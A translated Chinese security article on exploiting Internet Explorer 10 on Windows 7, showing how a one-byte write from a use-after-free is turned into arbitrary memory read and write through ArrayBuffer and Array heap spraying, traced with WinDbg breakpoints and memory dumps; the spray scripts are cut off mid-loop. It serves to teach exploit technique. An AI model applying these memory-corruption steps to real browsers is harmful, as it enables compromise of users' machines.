# IE：从一字节改写到全地址读写
|
##### 译文声明
本文是翻译文章，文章原作者 SevieZhou
译文仅供参考，具体内容表达以及含义原文为准。
作者：SevieZhou
预估稿费：800RMB
**（本篇文章享受双倍稿费 活动链接请**[ **点击此处**](http://bobao.360.cn/news/detail/4370.html)
**）**
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
## 前言
在浏览器的漏洞利用中，通过uaf漏洞能够改写一字节，这时可以利用这篇文章的方法实现任意地址读写，这里会详细阐述技术细节，解释每一步代码的含义，测试环境是win7
32bit sp1和IE10。
## 对象堆喷射
这种方法中通过两次对象的喷射实现地址预测。
首先是第一个对象喷射:
    	(function() {
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i  
目的是把一个ArrayBuffer的缓冲空间放在LargeHeapBlock之间:
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte LargeHeapBlock
    .
    .
    .
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte ArrayBuffer (buf)
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte LargeHeapBlock
为了追踪内存布局，我们要找到ArrayBuffer对象的地址，在jscript9!Js::JavascriptArrayBuffer::Create下断点，断下后返回:
    0:007> g
    Breakpoint 0 hit
    eax=00000058 ebx=022e1780 ecx=022fb000 edx=00000400 esi=01ff6890 edi=02e2ba54
    eip=610f2ba8 esp=02e2ba28 ebp=02e2ba48 iopl=0         nv up ei pl nz na po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200203
    jscript9!Js::JavascriptArrayBuffer::Create:
    610f2ba8 8bff            mov     edi,edi
    0:007> gu
    eax=02426dc0 ebx=022e1780 ecx=00000000 edx=00000000 esi=01ff6890 edi=02e2ba54
    eip=612bc16d esp=02e2ba30 ebp=02e2ba48 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
    jscript9!Js::ArrayBuffer::NewInstance+0x8d:
    612bc16d 5f              pop     edi
eax的值02426dc0就是ArrayBuffer对象的地址:
    0:006> dd 02426dc0 l9
    02426dc0  610f2bf8 022e9a00 00000000 00000003
    02426dd0  0203c8c0 00000058 00000000 00000000
    02426de0  02426e00
    0:006> ln poi(02426dc0)
    (610f2bf8)   jscript9!Js::JavascriptArrayBuffer::`vftable'   |  (612be1c8)   jscript9!Js::CopyOnWriteObject,Js::NoSpecialProperties>::`vftable'
    Exact matches:
        jscript9!Js::JavascriptArrayBuffer::`vftable' = 
+0x10处是缓冲区地址，也就是0203c8c0，这段地址确实在堆上，并且大小为0x58:
    0:006> !heap -p -a 0203c8c0
        address 0203c8c0 found in
        _HEAP @ 690000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0203c8b8 000c 0000  [00]   0203c8c0    00058 - (busy)
定位到这段内存，发现前后都是LargeHeapBlock对象:
    0203c858 7b0f6577 8c000000 610b1c7c 00000003  ln 610b1c7c
    (610b1c7c)   jscript9!LargeHeapBlock::`vftable'   |  (610b1ca0)   jscript9!Segment::`vftable'
    Exact matches:
        jscript9!LargeHeapBlock::`vftable' = 
接下来是第二次，脚本如下:
    	(function() {
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i  
这次需要三个断点，在第一个弹窗时下断点:
    0:013> bu jscript9!Js::ArrayBuffer::NewInstance+0x8d
    0:013> bl
     0 e 612bc16d     0001 (0001)  0:**** jscript9!Js::ArrayBuffer::NewInstance+0x8d
    0:013> g
    Breakpoint 0 hit
    eax=02452dc0 ebx=022e1780 ecx=00000000 edx=00000000 esi=020cf078 edi=02e2ba44
    eip=612bc16d esp=02e2ba20 ebp=02e2ba38 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
    jscript9!Js::ArrayBuffer::NewInstance+0x8d:
    612bc16d 5f              pop     edi
    0:007> ln poi(eax)
    (610f2bf8)   jscript9!Js::JavascriptArrayBuffer::`vftable'   |  (612be1c8)   jscript9!Js::CopyOnWriteObject,Js::NoSpecialProperties>::`vftable'
    Exact matches:
        jscript9!Js::JavascriptArrayBuffer::`vftable' = 
    0:007> dd eax l9
    02452dc0  610f2bf8 022e9a20 00000000 00000003
    02452dd0  087cc3c0 00000058 00000000 00000000
    02452de0  02452e00
这里获得了第一次喷射中ArrayBuffer对象信息，布置的缓冲区地址为087cc3c0。
然后继续，当第二个弹窗出现时，下另外两个断点:
    0:004> bl
     0 e 612bc16d     0001 (0001)  0:**** jscript9!Js::ArrayBuffer::NewInstance+0x8d
     1 e 61164589     0001 (0001)  0:**** jscript9!Js::JavascriptArray::DirectSetItem_Full+0x405
     2 e 612bdae6     0001 (0001)  0:**** jscript9!Js::TypedArrayBase::CreateNewInstance+0x1f1
当第一次断在断点1时，esi存放了Array对象的地址:
    0:007> g
    Breakpoint 1 hit
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=61164589 esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x405:
    61164589 894614          mov     dword ptr [esi+14h],eax ds:0023:092b3cf4=610be460
    0:007> ln poi(esi)
    (610b2f78)   jscript9!Js::JavascriptArray::`vftable'   |  (610b30e0)   jscript9!Js::JavascriptError::`vftable'
    Exact matches:
        jscript9!Js::JavascriptArray::`vftable' = 
    0:007> p
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=6116458c esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x408:
    6116458c 8955e8          mov     dword ptr [ebp-18h],edx ss:0023:02e2b9e4=00003bf8
    0:007> 
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=6116458f esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x40b:
    6116458f 895618          mov     dword ptr [esi+18h],edx ds:0023:092b3cf8=610be460
    0:007> 
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=61164592 esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x40e:
    61164592 e90390f9ff      jmp     jscript9!Js::JavascriptArray::DirectSetItem_Full+0x23 (610fd59a)
    0:007> dd esi
    092b3ce0  610b2f78 022e9a40 00000000 00000003
    092b3cf0  00003bf8 093b1010 093b1010 00000000
    092b3d00  00000000 00000000 00000000 00000000
    092b3d10  00000000 00000000 00000000 00000000
    092b3d20  00000000 00000000 00000000 00000000
    092b3d30  00000000 00000000 00000000 00000000
    092b3d40  00000000 00000000 00000000 00000000
    092b3d50  00000000 00000000 00000000 00000000
    0:007> dd 093b1010
    093b1010  00000000 00003bf8 00003bf8 00000000
    093b1020  00000000 00000000 00000000 00000000
    093b1030  00000000 00000000 00000000 00000000
    093b1040  00000000 00000000 00000000 00000000
    093b1050  00000000 00000000 00000000 00000000
    093b1060  00000000 00000000 00000000 00000000
    093b1070  00000000 00000000 00000000 00000000
    093b1080  00000000 00000000 00000000 00000000
这里得到Array对象地址092b3ce0，数组地址093b1010，看到现在数组里还没有元素，但长度是我们设置的00003bf8，然后断在断点2时:
    0:007> g
    Breakpoint 2 hit
    eax=092b70f0 ebx=02452dc0 ecx=02038678 edx=00000000 esi=088b9848 edi=00000016
    eip=612bdae6 esp=02e2b9f0 ebp=02e2ba10 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::TypedArrayBase::CreateNewInstance+0x1f1:
    612bdae6 8bf0            mov     esi,eax